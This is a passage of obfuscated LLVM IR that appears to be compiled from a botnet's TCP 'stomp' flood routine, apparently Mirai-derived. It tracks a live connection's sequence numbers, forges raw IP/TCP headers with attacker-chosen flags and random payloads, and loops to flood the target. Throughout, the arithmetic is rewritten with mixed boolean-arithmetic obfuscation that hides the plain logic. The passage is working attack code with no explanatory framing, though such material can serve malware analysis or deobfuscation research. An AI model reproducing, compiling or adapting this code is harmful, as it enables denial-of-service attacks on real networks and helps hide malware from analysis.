; <label>:236:                                    ; preds = %224
  %237 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %31, i32 0, i32 2
  %238 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %237, i32 0, i32 0
  %239 = load i32, i32* %238, align 4
  %240 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 2
  %241 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %240, i32 0, i32 0
  %242 = load i32, i32* %241, align 4
  %243 = icmp eq i32 %239, %242
  br i1 %243, label %244, label %724

; <label>:244:                                    ; preds = %236
  %245 = load i32, i32* %36, align 4
  %246 = sext i32 %245 to i64
  %247 = icmp ugt i64 %246, 40
  br i1 %247, label %248, label %724

; <label>:248:                                    ; preds = %244
  %249 = getelementptr inbounds [256 x i8], [256 x i8]* %33, i32 0, i32 0
  %250 = getelementptr inbounds i8, i8* %249, i64 20
  %251 = bitcast i8* %250 to %struct.tcphdr*
  store %struct.tcphdr* %251, %struct.tcphdr** %38, align 8
  %252 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %253 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %252, i32 0, i32 0
  %254 = load i16, i16* %253, align 4
  %255 = zext i16 %254 to i32
  %256 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 1
  %257 = load i16, i16* %256, align 2
  %258 = zext i16 %257 to i32
  %259 = icmp eq i32 %255, %258
  br i1 %259, label %260, label %723

; <label>:260:                                    ; preds = %248
  %261 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %262 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %261, i32 0, i32 4
  %263 = load i16, i16* %262, align 4
  %264 = lshr i16 %263, 9
  %265 = xor i16 %264, -1
  %266 = xor i16 1, -1
  %267 = xor i16 28080, -1
  %268 = or i16 %265, %266
  %269 = or i16 28080, %267
  %270 = xor i16 %268, -1
  %271 = and i16 %270, %269
  %272 = and i16 %264, 1
  %273 = zext i16 %271 to i32
  %274 = icmp ne i32 %273, 0
  br i1 %274, label %275, label %688

; <label>:275:                                    ; preds = %260
  %276 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %277 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %276, i32 0, i32 4
  %278 = load i16, i16* %277, align 4
  %279 = lshr i16 %278, 12
  %280 = xor i16 1, -1
  %281 = xor i16 %279, %280
  %282 = and i16 %281, %279
  %283 = and i16 %279, 1
  %284 = zext i16 %282 to i32
  %285 = icmp ne i32 %284, 0
  br i1 %285, label %286, label %688

; <label>:286:                                    ; preds = %275
  %287 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 2
  %288 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %287, i32 0, i32 0
  %289 = load i32, i32* %288, align 4
  %290 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %291 = load i32, i32* %11, align 4
  %292 = sext i32 %291 to i64
  %293 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %290, i64 %292
  %294 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %293, i32 0, i32 0
  store i32 %289, i32* %294, align 4
  %295 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %296 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %295, i32 0, i32 2
  %297 = load i32, i32* %296, align 4
  %298 = call i32 @ntohl(i32 %297) #7
  %299 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %300 = load i32, i32* %11, align 4
  %301 = sext i32 %300 to i64
  %302 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %299, i64 %301
  %303 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %302, i32 0, i32 1
  store i32 %298, i32* %303, align 4
  %304 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %305 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %304, i32 0, i32 3
  %306 = load i32, i32* %305, align 4
  %307 = call i32 @ntohl(i32 %306) #7
  %308 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %309 = load i32, i32* %11, align 4
  %310 = sext i32 %309 to i64
  %311 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %308, i64 %310
  %312 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %311, i32 0, i32 2
  store i32 %307, i32* %312, align 4
  %313 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %314 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %313, i32 0, i32 1
  %315 = load i16, i16* %314, align 2
  %316 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %317 = load i32, i32* %11, align 4
  %318 = sext i32 %317 to i64
  %319 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %316, i64 %318
  %320 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %319, i32 0, i32 3
  store i16 %315, i16* %320, align 4
  %321 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 1
  %322 = load i16, i16* %321, align 2
  %323 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %324 = load i32, i32* %11, align 4
  %325 = sext i32 %324 to i64
  %326 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %323, i64 %325
  %327 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %326, i32 0, i32 4
  store i16 %322, i16* %327, align 2
  %328 = load i32, i32* %26, align 4
  %329 = sext i32 %328 to i64
  %330 = sub i64 40, 8585905351746096958
  %331 = add i64 %330, %329
  %332 = add i64 %331, 8585905351746096958
  %333 = add i64 40, %329
  %334 = call noalias i8* @malloc(i64 %332) #6
  %335 = load i8**, i8*** %14, align 8
  %336 = load i32, i32* %11, align 4
  %337 = sext i32 %336 to i64
  %338 = getelementptr inbounds i8*, i8** %335, i64 %337
  store i8* %334, i8** %338, align 8
  %339 = load i8**, i8*** %14, align 8
  %340 = load i32, i32* %11, align 4
  %341 = sext i32 %340 to i64
  %342 = getelementptr inbounds i8*, i8** %339, i64 %341
  %343 = load i8*, i8** %342, align 8
  %344 = bitcast i8* %343 to %struct.iphdr*
  store %struct.iphdr* %344, %struct.iphdr** %39, align 8
  %345 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %346 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %345, i64 1
  %347 = bitcast %struct.iphdr* %346 to %struct.tcphdr*
  store %struct.tcphdr* %347, %struct.tcphdr** %40, align 8
  %348 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %349 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %348, i64 1
  %350 = bitcast %struct.tcphdr* %349 to i8*
  store i8* %350, i8** %41, align 8
  %351 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %352 = bitcast %struct.iphdr* %351 to i8*
  %353 = load i8, i8* %352, align 4
  %354 = xor i8 15, -1
  %355 = xor i8 %353, %354
  %356 = and i8 %355, %353
  %357 = and i8 %353, 15
  %358 = and i8 %356, 64
  %359 = xor i8 %356, 64
  %360 = or i8 %358, %359
  %361 = or i8 %356, 64
  store i8 %360, i8* %352, align 4
  %362 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %363 = bitcast %struct.iphdr* %362 to i8*
  %364 = load i8, i8* %363, align 4
  %365 = xor i8 %364, -1
  %366 = xor i8 -16, -1
  %367 = xor i8 -5, -1
  %368 = or i8 %365, %366
  %369 = or i8 -5, %367
  %370 = xor i8 %368, -1
  %371 = and i8 %370, %369
  %372 = and i8 %364, -16
  %373 = xor i8 %371, -1
  %374 = xor i8 5, -1
  %375 = xor i8 90, -1
  %376 = and i8 %373, 90
  %377 = and i8 %371, %375
  %378 = and i8 %374, 90
  %379 = and i8 5, %375
  %380 = or i8 %376, %377
  %381 = or i8 %378, %379
  %382 = xor i8 %380, %381
  %383 = or i8 %373, %374
  %384 = xor i8 %383, -1
  %385 = or i8 90, %375
  %386 = and i8 %384, %385
  %387 = or i8 %382, %386
  %388 = or i8 %371, 5
  store i8 %387, i8* %363, align 4
  %389 = load i8, i8* %15, align 1
  %390 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %391 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %390, i32 0, i32 1
  store i8 %389, i8* %391, align 1
  %392 = load i32, i32* %26, align 4
  %393 = sext i32 %392 to i64
  %394 = add i64 40, 81436938821476101
  %395 = add i64 %394, %393
  %396 = sub i64 %395, 81436938821476101
  %397 = add i64 40, %393
  %398 = trunc i64 %396 to i16
  %399 = call zeroext i16 @htons(i16 zeroext %398) #7
  %400 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %401 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %400, i32 0, i32 2
  store i16 %399, i16* %401, align 2
  %402 = load i16, i16* %16, align 2
  %403 = call zeroext i16 @htons(i16 zeroext %402) #7
  %404 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %405 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %404, i32 0, i32 3
  store i16 %403, i16* %405, align 4
  %406 = load i8, i8* %17, align 1
  %407 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %408 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %407, i32 0, i32 5
  store i8 %406, i8* %408, align 4
  %409 = load i8, i8* %18, align 1
  %410 = icmp ne i8 %409, 0
  br i1 %410, label %411, label %415

; <label>:411:                                    ; preds = %286
  %412 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %413 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %414 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %413, i32 0, i32 4
  store i16 %412, i16* %414, align 2
  br label %415

; <label>:415:                                    ; preds = %411, %286
  %416 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %417 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %416, i32 0, i32 6
  store i8 6, i8* %417, align 1
  %418 = load i32, i32* @LOCAL_ADDR, align 4
  %419 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %420 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %419, i32 0, i32 8
  store i32 %418, i32* %420, align 4
  %421 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %422 = load i32, i32* %11, align 4
  %423 = sext i32 %422 to i64
  %424 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %421, i64 %423
  %425 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %424, i32 0, i32 0
  %426 = load i32, i32* %425, align 4
  %427 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %428 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %427, i32 0, i32 9
  store i32 %426, i32* %428, align 4
  %429 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %430 = load i32, i32* %11, align 4
  %431 = sext i32 %430 to i64
  %432 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %429, i64 %431
  %433 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %432, i32 0, i32 3
  %434 = load i16, i16* %433, align 4
  %435 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %436 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %435, i32 0, i32 0
  store i16 %434, i16* %436, align 4
  %437 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %438 = load i32, i32* %11, align 4
  %439 = sext i32 %438 to i64
  %440 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %437, i64 %439
  %441 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %440, i32 0, i32 4
  %442 = load i16, i16* %441, align 2
  %443 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %444 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %443, i32 0, i32 1
  store i16 %442, i16* %444, align 2
  %445 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %446 = load i32, i32* %11, align 4
  %447 = sext i32 %446 to i64
  %448 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %445, i64 %447
  %449 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %448, i32 0, i32 2
  %450 = load i32, i32* %449, align 4
  %451 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %452 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %451, i32 0, i32 2
  store i32 %450, i32* %452, align 4
  %453 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %454 = load i32, i32* %11, align 4
  %455 = sext i32 %454 to i64
  %456 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %453, i64 %455
  %457 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %456, i32 0, i32 1
  %458 = load i32, i32* %457, align 4
  %459 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %460 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %459, i32 0, i32 3
  store i32 %458, i32* %460, align 4
  %461 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %462 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %461, i32 0, i32 4
  %463 = load i16, i16* %462, align 4
  %464 = xor i16 -241, -1
  %465 = xor i16 %463, %464
  %466 = and i16 %465, %463
  %467 = and i16 %463, -241
  %468 = xor i16 %466, -1
  %469 = xor i16 128, -1
  %470 = xor i16 -11181, -1
  %471 = and i16 %468, -11181
  %472 = and i16 %466, %470
  %473 = and i16 %469, -11181
  %474 = and i16 128, %470
  %475 = or i16 %471, %472
  %476 = or i16 %473, %474
  %477 = xor i16 %475, %476
  %478 = or i16 %468, %469
  %479 = xor i16 %478, -1
  %480 = or i16 -11181, %470
  %481 = and i16 %479, %480
  %482 = or i16 %477, %481
  %483 = or i16 %466, 128
  store i16 %482, i16* %462, align 4
  %484 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %485 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %484, i32 0, i32 4
  %486 = load i16, i16* %485, align 4
  %487 = xor i16 -257, -1
  %488 = xor i16 %486, %487
  %489 = and i16 %488, %486
  %490 = and i16 %486, -257
  %491 = and i16 %489, 256
  %492 = xor i16 %489, 256
  %493 = or i16 %491, %492
  %494 = or i16 %489, 256
  store i16 %493, i16* %485, align 4
  %495 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %496 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %495, i32 0, i32 4
  %497 = load i16, i16* %496, align 4
  %498 = xor i16 -4097, -1
  %499 = xor i16 %497, %498
  %500 = and i16 %499, %497
  %501 = and i16 %497, -4097
  %502 = xor i16 %500, -1
  %503 = xor i16 4096, -1
  %504 = xor i16 20963, -1
  %505 = and i16 %502, 20963
  %506 = and i16 %500, %504
  %507 = and i16 %503, 20963
  %508 = and i16 4096, %504
  %509 = or i16 %505, %506
  %510 = or i16 %507, %508
  %511 = xor i16 %509, %510
  %512 = or i16 %502, %503
  %513 = xor i16 %512, -1
  %514 = or i16 20963, %504
  %515 = and i16 %513, %514
  %516 = or i16 %511, %515
  %517 = or i16 %500, 4096
  store i16 %516, i16* %496, align 4
  %518 = call i32 @rand_next()
  %519 = xor i32 %518, -1
  %520 = xor i32 65535, -1
  %521 = xor i32 -549571311, -1
  %522 = or i32 %519, %520
  %523 = or i32 -549571311, %521
  %524 = xor i32 %522, -1
  %525 = and i32 %524, %523
  %526 = and i32 %518, 65535
  %527 = trunc i32 %525 to i16
  %528 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %529 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %528, i32 0, i32 5
  store i16 %527, i16* %529, align 2
  %530 = load i8, i8* %20, align 1
  %531 = sext i8 %530 to i16
  %532 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %533 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %532, i32 0, i32 4
  %534 = load i16, i16* %533, align 4
  %535 = xor i16 1, -1
  %536 = xor i16 %531, %535
  %537 = and i16 %536, %531
  %538 = and i16 %531, 1
  %539 = shl i16 %537, 13
  %540 = xor i16 -8193, -1
  %541 = xor i16 %534, %540
  %542 = and i16 %541, %534
  %543 = and i16 %534, -8193
  %544 = and i16 %542, %539
  %545 = xor i16 %542, %539
  %546 = or i16 %544, %545
  %547 = or i16 %542, %539
  store i16 %546, i16* %533, align 4
  %548 = load i8, i8* %21, align 1
  %549 = sext i8 %548 to i16
  %550 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %551 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %550, i32 0, i32 4
  %552 = load i16, i16* %551, align 4
  %553 = xor i16 1, -1
  %554 = xor i16 %549, %553
  %555 = and i16 %554, %549
  %556 = and i16 %549, 1
  %557 = shl i16 %555, 12
  %558 = xor i16 %552, -1
  %559 = xor i16 -4097, -1
  %560 = xor i16 23517, -1
  %561 = or i16 %558, %559
  %562 = or i16 23517, %560
  %563 = xor i16 %561, -1
  %564 = and i16 %563, %562
  %565 = and i16 %552, -4097
  %566 = xor i16 %564, -1
  %567 = xor i16 %557, -1
  %568 = xor i16 -26561, -1
  %569 = and i16 %566, -26561
  %570 = and i16 %564, %568
  %571 = and i16 %567, -26561
  %572 = and i16 %557, %568
  %573 = or i16 %569, %570
  %574 = or i16 %571, %572
  %575 = xor i16 %573, %574
  %576 = or i16 %566, %567
  %577 = xor i16 %576, -1
  %578 = or i16 -26561, %568
  %579 = and i16 %577, %578
  %580 = or i16 %575, %579
  %581 = or i16 %564, %557
  store i16 %580, i16* %551, align 4
  %582 = load i8, i8* %22, align 1
  %583 = sext i8 %582 to i16
  %584 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %585 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %584, i32 0, i32 4
  %586 = load i16, i16* %585, align 4
  %587 = xor i16 %583, -1
  %588 = xor i16 1, -1
  %589 = xor i16 -29265, -1
  %590 = or i16 %587, %588
  %591 = or i16 -29265, %589
  %592 = xor i16 %590, -1
  %593 = and i16 %592, %591
  %594 = and i16 %583, 1
  %595 = shl i16 %593, 11
  %596 = xor i16 -2049, -1
  %597 = xor i16 %586, %596
  %598 = and i16 %597, %586
  %599 = and i16 %586, -2049
  %600 = and i16 %598, %595
  %601 = xor i16 %598, %595
  %602 = or i16 %600, %601
  %603 = or i16 %598, %595
  store i16 %602, i16* %585, align 4
  %604 = load i8, i8* %23, align 1
  %605 = sext i8 %604 to i16
  %606 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %607 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %606, i32 0, i32 4
  %608 = load i16, i16* %607, align 4
  %609 = xor i16 1, -1
  %610 = xor i16 %605, %609
  %611 = and i16 %610, %605
  %612 = and i16 %605, 1
  %613 = shl i16 %611, 10
  %614 = xor i16 %608, -1
  %615 = xor i16 -1025, -1
  %616 = xor i16 -16441, -1
  %617 = or i16 %614, %615
  %618 = or i16 -16441, %616
  %619 = xor i16 %617, -1
  %620 = and i16 %619, %618
  %621 = and i16 %608, -1025
  %622 = xor i16 %620, -1
  %623 = xor i16 %613, -1
  %624 = xor i16 5356, -1
  %625 = and i16 %622, 5356
  %626 = and i16 %620, %624
  %627 = and i16 %623, 5356
  %628 = and i16 %613, %624
  %629 = or i16 %625, %626
  %630 = or i16 %627, %628
  %631 = xor i16 %629, %630
  %632 = or i16 %622, %623
  %633 = xor i16 %632, -1
  %634 = or i16 5356, %624
  %635 = and i16 %633, %634
  %636 = or i16 %631, %635
  %637 = or i16 %620, %613
  store i16 %636, i16* %607, align 4
  %638 = load i8, i8* %24, align 1
  %639 = sext i8 %638 to i16
  %640 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %641 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %640, i32 0, i32 4
  %642 = load i16, i16* %641, align 4
  %643 = xor i16 %639, -1
  %644 = xor i16 1, -1
  %645 = xor i16 -14283, -1
  %646 = or i16 %643, %644
  %647 = or i16 -14283, %645
  %648 = xor i16 %646, -1
  %649 = and i16 %648, %647
  %650 = and i16 %639, 1
  %651 = shl i16 %649, 9
  %652 = xor i16 -513, -1
  %653 = xor i16 %642, %652
  %654 = and i16 %653, %642
  %655 = and i16 %642, -513
  %656 = and i16 %654, %651
  %657 = xor i16 %654, %651
  %658 = or i16 %656, %657
  %659 = or i16 %654, %651
  store i16 %658, i16* %641, align 4
  %660 = load i8, i8* %25, align 1
  %661 = sext i8 %660 to i16
  %662 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %663 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %662, i32 0, i32 4
  %664 = load i16, i16* %663, align 4
  %665 = xor i16 %661, -1
  %666 = xor i16 1, -1
  %667 = xor i16 -5612, -1
  %668 = or i16 %665, %666
  %669 = or i16 -5612, %667
  %670 = xor i16 %668, -1
  %671 = and i16 %670, %669
  %672 = and i16 %661, 1
  %673 = shl i16 %671, 8
  %674 = xor i16 -257, -1
  %675 = xor i16 %664, %674
  %676 = and i16 %675, %664
  %677 = and i16 %664, -257
  %678 = and i16 %676, %673
  %679 = xor i16 %676, %673
  %680 = or i16 %678, %679
  %681 = or i16 %676, %673
  store i16 %680, i16* %663, align 4
  %682 = load i8*, i8** %41, align 8
  %683 = load i32, i32* %26, align 4
  call void @rand_alpha_str(i8* %682, i32 %683)
  %684 = load i8*, i8** %41, align 8
  %685 = load i32, i32* %26, align 4
  %686 = sext i32 %685 to i64
  %687 = getelementptr inbounds i8, i8* %684, i64 %686
  store i8 0, i8* %687, align 1
  br label %735

; <label>:688:                                    ; preds = %275, %260
  %689 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %690 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %689, i32 0, i32 4
  %691 = load i16, i16* %690, align 4
  %692 = lshr i16 %691, 8
  %693 = xor i16 %692, -1
  %694 = xor i16 1, -1
  %695 = xor i16 -26532, -1
  %696 = or i16 %693, %694
  %697 = or i16 -26532, %695
  %698 = xor i16 %696, -1
  %699 = and i16 %698, %697
  %700 = and i16 %692, 1
  %701 = zext i16 %699 to i32
  %702 = icmp ne i32 %701, 0
  br i1 %702, label %718, label %703

; <label>:703:                                    ; preds = %688
  %704 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %705 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %704, i32 0, i32 4
  %706 = load i16, i16* %705, align 4
  %707 = lshr i16 %706, 10
  %708 = xor i16 %707, -1
  %709 = xor i16 1, -1
  %710 = xor i16 14492, -1
  %711 = or i16 %708, %709
  %712 = or i16 14492, %710
  %713 = xor i16 %711, -1
  %714 = and i16 %713, %712
  %715 = and i16 %707, 1
  %716 = zext i16 %714 to i32
  %717 = icmp ne i32 %716, 0
  br i1 %717, label %718, label %721

; <label>:718:                                    ; preds = %703, %688
  %719 = load i32, i32* %29, align 4
  %720 = call i32 @close(i32 %719)
  br label %132

; <label>:721:                                    ; preds = %703
  br label %722

; <label>:722:                                    ; preds = %721
  br label %723

; <label>:723:                                    ; preds = %722, %248
  br label %724

; <label>:724:                                    ; preds = %723, %244, %236
  %725 = call i64 @time(i64* null) #6
  %726 = load i64, i64* %34, align 8
  %727 = sub i64 0, %726
  %728 = add i64 %725, %727
  %729 = sub nsw i64 %725, %726
  %730 = icmp sgt i64 %728, 10
  br i1 %730, label %731, label %734

; <label>:731:                                    ; preds = %724
  %732 = load i32, i32* %29, align 4
  %733 = call i32 @close(i32 %732)
  br label %132

; <label>:734:                                    ; preds = %724
  br label %224

; <label>:735:                                    ; preds = %415
  br label %736

; <label>:736:                                    ; preds = %735, %135
  %737 = load i32, i32* %11, align 4
  %738 = sub i32 %737, -817025439
  %739 = add i32 %738, 1
  %740 = add i32 %739, -817025439
  %741 = add nsw i32 %737, 1
  store i32 %740, i32* %11, align 4
  br label %126

; <label>:742:                                    ; preds = %126
  br label %743

; <label>:743:                                    ; preds = %884, %742
  store i32 0, i32* %11, align 4
  br label %744

; <label>:744:                                    ; preds = %872, %743
  %745 = load i32, i32* %11, align 4
  %746 = load i8, i8* %7, align 1
  %747 = zext i8 %746 to i32
  %748 = icmp slt i32 %745, %747
  br i1 %748, label %749, label %878

; <label>:749:                                    ; preds = %744
  %750 = load i8**, i8*** %14, align 8
  %751 = load i32, i32* %11, align 4
  %752 = sext i32 %751 to i64
  %753 = getelementptr inbounds i8*, i8** %750, i64 %752
  %754 = load i8*, i8** %753, align 8
  store i8* %754, i8** %42, align 8
  %755 = load i8*, i8** %42, align 8
  %756 = bitcast i8* %755 to %struct.iphdr*
  store %struct.iphdr* %756, %struct.iphdr** %43, align 8
  %757 = load %struct.iphdr*, %struct.iphdr** %43, align 8
  %758 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %757, i64 1
  %759 = bitcast %struct.iphdr* %758 to %struct.tcphdr*
  store %struct.tcphdr* %759, %struct.tcphdr** %44, align 8
  %760 = load %struct.tcphdr*, %struct.tcphdr** %44, align 8
  %761 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %760, i64 1
  %762 = bitcast %struct.tcphdr* %761 to i8*
  store i8* %762, i8** %45, align 8
  %763 = load i16, i16* %16, align 2
  %764 = zext i16 %763 to i32
  %765 = icmp eq i32 %764, 65535
  br i1 %765, label %766, label %779

; <label>:766:                                    ; preds = %749
  %767 = call i32 @rand_next()
  %768 = xor i32 %767, -1
  %769 = xor i32 65535, -1
  %770 = xor i32 -1090948908, -1
  %771 = or i32 %768, %769
  %772 = or i32 -1090948908, %770
  %773 = xor i32 %771, -1
  %774 = and i32 %773, %772
  %775 = and i32 %767, 65535
  %776 = trunc i32 %774 to i16
  %777 = load %struct.iphdr*, %struct.iphdr** %43, align 8
  %778 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %777, i32 0, i32 3
  store i16 %776, i16* %778, align 4
  br label %779

; <label>:779:                                    ; preds = %766, %749
  %780 = load i8, i8* %27, align 1
  %781 = icmp ne i8 %780, 0
  br i1 %781, label %782, label %789

; <label>:782:                                    ; preds = %779
  %783 = load i8*, i8** %45, align 8
  %784 = load i32, i32* %26, align 4
  call void @rand_alpha_str(i8* %783, i32 %784)
  %785 = load i8*, i8** %45, align 8
  %786 = load i32, i32* %26, align 4
  %787 = sext i32 %786 to i64
  %788 = getelementptr inbounds i8, i8* %785, i64 %787
  store i8 0, i8* %788, align 1
  br label %789

; <label>:789:                                    ; preds = %782, %779
  %790 = load %struct.iphdr*, %struct.iphdr** %43, align 8
  %791 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %790, i32 0, i32 7
  store i16 0, i16* %791, align 2
  %792 = load %struct.iphdr*, %struct.iphdr** %43, align 8
  %793 = bitcast %struct.iphdr* %792 to i16*
  %794 = call zeroext i16 @checksum_generic(i16* %793, i32 20)
  %795 = load %struct.iphdr*, %struct.iphdr** %43, align 8
  %796 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %795, i32 0, i32 7
  store i16 %794, i16* %796, align 2
  %797 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %798 = load i32, i32* %11, align 4
  %799 = sext i32 %798 to i64
  %800 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %797, i64 %799
  %801 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %800, i32 0, i32 1
  %802 = load i32, i32* %801, align 4
  %803 = add i32 %802, 1457145146
  %804 = add i32 %803, 1
  %805 = sub i32 %804, 1457145146
  %806 = add i32 %802, 1
  store i32 %805, i32* %801, align 4
  %807 = trunc i32 %802 to i16
  %808 = call zeroext i16 @htons(i16 zeroext %807) #7
  %809 = zext i16 %808 to i32
  %810 = load %struct.tcphdr*, %struct.tcphdr** %44, align 8
  %811 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %810, i32 0, i32 2
  store i32 %809, i32* %811, align 4
  %812 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %813 = load i32, i32* %11, align 4
  %814 = sext i32 %813 to i64
  %815 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %812, i64 %814
  %816 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %815, i32 0, i32 2
  %817 = load i32, i32* %816, align 4
  %818 = trunc i32 %817 to i16
  %819 = call zeroext i16 @htons(i16 zeroext %818) #7
  %820 = zext i16 %819 to i32
  %821 = load %struct.tcphdr*, %struct.tcphdr** %44, align 8
  %822 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %821, i32 0, i32 3
  store i32 %820, i32* %822, align 4
  %823 = load %struct.tcphdr*, %struct.tcphdr** %44, align 8
  %824 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %823, i32 0, i32 6
  store i16 0, i16* %824, align 4
  %825 = load %struct.iphdr*, %struct.iphdr** %43, align 8
  %826 = load %struct.tcphdr*, %struct.tcphdr** %44, align 8
  %827 = bitcast %struct.tcphdr* %826 to i8*
  %828 = load i32, i32* %26, align 4
  %829 = sext i32 %828 to i64
  %830 = sub i64 0, %829
  %831 = sub i64 20, %830
  %832 = add i64 20, %829
  %833 = trunc i64 %831 to i16
  %834 = call zeroext i16 @htons(i16 zeroext %833) #7
  %835 = load i32, i32* %26, align 4
  %836 = sext i32 %835 to i64
  %837 = add i64 20, 5600508315444799237
